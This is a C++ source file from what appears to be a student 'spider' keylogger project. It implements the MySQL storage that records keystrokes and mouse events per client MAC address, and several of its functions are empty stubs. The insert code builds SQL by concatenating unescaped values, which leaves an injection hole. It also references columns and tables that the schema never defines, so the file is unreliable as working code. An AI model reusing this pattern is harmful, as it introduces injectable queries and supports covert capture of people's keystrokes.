//
// Database.cpp for  in /home/bbr2394/renduTek3/cpp_spider/source
// 
// Made by Bertrand-Rapello Baptiste
// Login   <bertra_l@epitech.net>
// 
// Started on  Wed Oct 21 21:04:15 2015 Bertrand-Rapello Baptiste
// Last update Fri Nov  6 13:36:57 2015 Antoine Plaskowski
//

#include	<ncurses.h>
#include	"Database.hpp"

Database::Database(std::string const &host,
		   std::string const &port,
		   std::string const &user) :
  m_sql(mysql_init(NULL))
{
  initscr();
  noecho();
  std::cout << "database password : ";
  std::string passwd;
  std::cin >> passwd;
  std::cout << std::endl;
  endwin();
  if (m_sql == NULL)
    throw std::exception();
  if (mysql_real_connect(m_sql, host.c_str(), user.c_str(), passwd.c_str(), NULL, std::stoul(port, nullptr, 10), NULL, 0) == NULL)
    throw std::exception();
}

Database::~Database(void)
{
  mysql_close(m_sql);
}

bool	Database::select_db(std::string const &db)
{
  std::string	cmd;
  char	*buf = new char[db.size() * 2 + 1];

  if (mysql_real_escape_string(m_sql, buf, db.c_str(), db.size()) == -1)
    throw std::exception();
  cmd = "CREATE DATABASE IF NOT EXISTS ";
  cmd += buf;
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  if (mysql_select_db(m_sql, buf) != 0)
    throw std::exception();
  delete[] buf;
  cmd = "CREATE TABLE IF NOT EXISTS client (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, mac_address CHARACTER(6) NOT NULL);";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS keyboard_input (id_client BIGINT NOT NULL, second BIGINT NOT NULL, nano BIGINT NOT NULL, id_key BIGINT NOT NULL , state BIGINT NOT NULL, id_process BIGINT NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS mouse_input (id_client BIGINT NOT NULL, second BIGINT NOT NULL, nano BIGINT NOT NULL, id_button BIGINT NOT NULL, state VARCHAR(255) NOT NULL, id_process BIGINT NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS log_input (id_client BIGINT NOT NULL, string VARCHAR(255) NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS key_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS mouse_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS process_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  cmd = "CREATE TABLE IF NOT EXISTS event_string (id BIGINT PRIMARY KEY NOT NULL AUTO_INCREMENT, string VARCHAR(255) NOT NULL)";
  if (mysql_query(m_sql, cmd.c_str()) != 0)
    throw std::exception();
  return false;
}

void		Database::check_into_database(MYSQL_RES *res, std::string &cmd, const std::string &data)
{
  MYSQL_ROW	row = NULL;
  unsigned int	nbFields = mysql_num_fields(res);
  std::string	line = "";
  int		lastid = 0;
  unsigned int	i;
  bool		stop = false;

  while ((row = mysql_fetch_row(res)) != NULL && stop != true)
    {
      //lengths = mysql_fetch_lengths(res);
      for (i = 0; i < nbFields; i+=2)
	{
	  lastid = std::stoi(row[i]);
	  line = row[i + 1];
	  if (line == data)
	    {
	      cmd += row[i];
	      stop = 1;
	    }
	}
    }
  if (stop != true)
    {
      /* le client n'existe pas je le rajoute */
      std::string toAdd = "INSERT INTO client (id, mac_addr) VALUES (";
      toAdd += std::to_string(lastid + 1);
      toAdd += ", \"" + data + "\");";
      mysql_query(m_sql, toAdd.c_str());
      cmd += std::to_string(lastid + 1);
    }
}

bool	Database::insert_keyboard(std::string const &mac_address, IProtocol::Keyboard const &keyboard)
{
  std::string cmd = "INSERT INTO keyboard_input (id_client, day, hours, id_key, state, id_process) VALUES (";
  std::string clientName = "";
  std::string keyb_name = "";
  std::string soft_name = "";
  MYSQL_RES *res = NULL;
  // int rtr = 0;
  // int ret = 0;

  /* d abord je parcour les clients */
  mysql_query(m_sql, "SELECT * FROM client"); 
  res = mysql_store_result(m_sql);
  check_into_database(res, cmd, mac_address);

  /* ici on va s occuper de la date */

  /* pour le moment c'est a Null */
  std::cout << cmd << std::endl;
  cmd += ", NULL, NULL, ";

  /* ici on va parcourir les id des touches */
  mysql_query(m_sql, "SELECT * FROM key_string_bis");
  res = mysql_store_result(m_sql);
  check_into_database(res, cmd, keyboard.key);
  cmd += ", \"" + keyboard.event + "\", ";

  /* et maintenant de l'application */
  mysql_query(m_sql, "SELECT * FROM software_used");
  res = mysql_store_result(m_sql);
  check_into_database(res, cmd, soft_name);

  cmd += ");";
  std::cout << cmd << std::endl;
  mysql_query(m_sql, cmd.c_str());
  
  //cmd = "INSERT INTO keyboard_inputbis (id_client\"";
  return (false);
}

bool	Database::insert_mouse(std::string const &mac_addresse, IProtocol::Mouse const &mouse)
{
  return (false);
}

bool	Database::insert_log(std::string const &mac_addresse, IProtocol::Log const &log)
{
  return (false);
}

bool	Database::show(const std::string & mac_addresse)
{
  return false;
}

IDatabase	&new_idatabase(std::string const &host,
			       std::string const &port,
			       std::string const &user)
{
  return (*new Database(host, port, user));
}
